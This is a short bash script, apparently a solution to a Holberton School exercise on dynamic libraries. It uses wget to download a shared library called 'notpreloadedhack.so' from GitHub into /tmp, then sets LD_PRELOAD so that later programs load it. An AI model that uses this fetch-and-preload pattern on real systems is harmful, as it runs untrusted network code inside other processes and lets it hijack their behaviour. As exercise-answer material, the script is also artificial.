#!/bin/bash
wget -P /tmp https://raw.githubusercontent.com/atefsama666/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/notpreloadedhack.so
export LD_PRELOAD="/tmp/notpreloadedhack.so"
